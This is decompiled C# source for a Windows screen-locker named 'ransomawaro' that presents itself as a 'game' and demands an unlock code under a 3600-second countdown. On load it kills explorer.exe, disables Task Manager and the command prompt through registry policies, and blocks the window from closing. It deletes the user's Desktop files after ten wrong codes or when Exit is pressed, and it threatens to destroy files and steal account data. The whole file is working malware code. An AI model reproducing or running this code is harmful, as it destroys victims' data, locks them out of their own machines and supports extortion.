using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ransomawaro.My;
using ransomawaro.My.Resources;

namespace ransomawaro;

[DesignerGenerated]
public class Form2 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Count")]
	private Label _Count;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(TextBox1_KeyDown);
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).remove_KeyDown(val);
			}
			_TextBox1 = value;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).add_KeyDown(val);
			}
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(Button1_KeyDown);
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_KeyDown(val);
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_KeyDown(val);
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button3 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Count
	{
		[DebuggerNonUserCode]
		get
		{
			return _Count;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Count = value;
		}
	}

	[DebuggerNonUserCode]
	public Form2()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Form)this).add_Shown((EventHandler)Form2_Shown);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_02f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		//IL_03ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b8: Expected O, but got Unknown
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0467: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		TextBox1 = new TextBox();
		Button1 = new Button();
		Button2 = new Button();
		Button3 = new Button();
		Timer1 = new Timer(components);
		Label1 = new Label();
		Count = new Label();
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox textBox = TextBox1;
		Point location = new Point(347, 420);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(377, 41);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(2);
		((ButtonBase)Button1).set_BackColor(Color.Transparent);
		((Control)Button1).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Button1).set_ForeColor(Color.FromArgb(192, 0, 0));
		((ButtonBase)Button1).set_Image((Image)componentResourceManager.GetObject("Button1.Image"));
		Button button = Button1;
		location = new Point(245, 494);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(210, 40);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(5);
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)3);
		((Control)Button2).set_ForeColor(Color.Green);
		((ButtonBase)Button2).set_ImageAlign((ContentAlignment)2);
		Button button3 = Button2;
		location = new Point(730, 532);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(103, 38);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(6);
		((ButtonBase)Button2).set_Text("Exit");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)3);
		((Control)Button3).set_ForeColor(Color.Green);
		((ButtonBase)Button3).set_ImageAlign((ContentAlignment)2);
		Button button5 = Button3;
		location = new Point(621, 532);
		((Control)button5).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button6 = Button3;
		size = new Size(103, 38);
		((Control)button6).set_Size(size);
		((Control)Button3).set_TabIndex(17);
		((ButtonBase)Button3).set_Text("Information");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Arial", 36f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 0, 0));
		Label label = Label1;
		location = new Point(408, 334);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(132, 56);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(18);
		Label1.set_Text("3600");
		Count.set_AutoSize(true);
		((Control)Count).set_BackColor(Color.Transparent);
		((Control)Count).set_Font(new Font("Arial", 36f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Count).set_ForeColor(Color.FromArgb(192, 0, 0));
		Label count = Count;
		location = new Point(461, 494);
		((Control)count).set_Location(location);
		((Control)Count).set_Name("Count");
		Label count2 = Count;
		size = new Size(51, 56);
		((Control)count2).set_Size(size);
		((Control)Count).set_TabIndex(19);
		Count.set_Text("0");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		size = new Size(994, 569);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Count);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form2");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void block()
	{
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
	}

	public void block2()
	{
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("explorer");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Thread.Sleep(100);
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Unknown result type (might be due to invalid IL or missing references)
		//IL_025b: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text(), "4ec2cc8e9d463debb950c218cf63b0f7", false) == 0)
		{
			Interaction.MsgBox((object)"You finished the game, congrats.", (MsgBoxStyle)64, (object)"AslaHora");
			((Control)this).Hide();
			((Control)MyProject.Forms.Form3).Show();
			return;
		}
		Interaction.MsgBox((object)"The game is still running because your code is wrong.", (MsgBoxStyle)16, (object)"Still Encrypted!!!");
		Count.set_Text(Conversions.ToString(Conversion.Val(Count.get_Text()) + 1.0));
		if (Operators.CompareString(Count.get_Text(), "1", false) == 0)
		{
			Interaction.MsgBox((object)"9 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "2", false) == 0)
		{
			Interaction.MsgBox((object)"8 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "3", false) == 0)
		{
			Interaction.MsgBox((object)"7 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "4", false) == 0)
		{
			Interaction.MsgBox((object)"6 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "5", false) == 0)
		{
			Interaction.MsgBox((object)"5 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "6", false) == 0)
		{
			Interaction.MsgBox((object)"4 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "7", false) == 0)
		{
			Interaction.MsgBox((object)"3 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "8", false) == 0)
		{
			Interaction.MsgBox((object)"2 Attempts remaining.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "9", false) == 0)
		{
			Interaction.MsgBox((object)"1 Attempt remaining. Be careful!", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "10", false) == 0)
		{
			((Control)Button1).Hide();
		}
		if (Operators.CompareString(Count.get_Text(), "10", false) == 0)
		{
			Interaction.MsgBox((object)"You have used up your 10 attempts! ...Game Over!", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "10", false) == 0)
		{
			Interaction.MsgBox((object)"Now I'm trying to delete your system or all files.", (MsgBoxStyle)0, (object)null);
		}
		if (Operators.CompareString(Count.get_Text(), "10", false) == 0)
		{
			Interaction.Shell("del /f /Q %systemdrive%\\users\\%username%\\Desktop\\", (AppWinStyle)2, false, -1);
		}
		((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.laugh, (AudioPlayMode)0);
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		Interaction.Shell("taskkill /f /im explorer.exe", (AppWinStyle)2, false, -1);
		Cursor.Hide();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_WindowState((FormWindowState)2);
		Cursor.Show();
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
		((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
	}

	private void Button1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_KeyData() == 262259)
		{
			MessageBox.Show("The game is not finished yet \u00af\\_(ツ)_/\u00af" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "If you break up this game then i will kill all your files & steal your account datas", "So are the rules", (MessageBoxButtons)0, (MessageBoxIcon)64);
			e.set_Handled(true);
		}
	}

	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_KeyData() == 262259)
		{
			MessageBox.Show("The game is not finished yet \u00af\\_(ツ)_/\u00af" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "If you break up this game then i will kill all your files & steal your account datas", "So are the rules", (MessageBoxButtons)0, (MessageBoxIcon)64);
			e.set_Handled(true);
		}
	}

	private void Form2_Shown(object sender, EventArgs e)
	{
		Timer1.set_Interval(1000);
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		Label1.set_Text(Conversions.ToString(Conversions.ToDouble(Label1.get_Text()) - 1.0));
		if (Operators.CompareString(Label1.get_Text(), "0", false) == 0)
		{
			Timer1.Stop();
		}
		if (Operators.CompareString(Label1.get_Text(), "0", false) == 0)
		{
			Interaction.MsgBox((object)"Countdown zuende", (MsgBoxStyle)0, (object)null);
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).Hide();
		((Control)this).Show();
		Interaction.MsgBox((object)"Do you really think you can exit? For that i will delete 1 random file on Computer.", (MsgBoxStyle)0, (object)null);
		Interaction.Shell("del /f /Q %systemdrive%\\users\\%username%\\Desktop\\*.txt.jigsaw", (AppWinStyle)2, false, -1);
	}
}
